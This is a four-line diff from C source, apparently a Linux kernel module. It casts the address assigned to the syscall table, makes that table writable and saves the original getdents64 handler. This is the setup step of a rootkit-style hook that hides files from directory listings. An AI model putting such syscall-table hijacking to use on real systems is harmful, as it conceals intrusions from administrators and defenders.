@@ -90,7 +90,7 @@ int f_init(void) {
     return -1;
   }
 
-  sys_call_table = a;
+  sys_call_table = (void*)(uintptr_t)a;
 
   set_page_rw((uintptr_t)sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
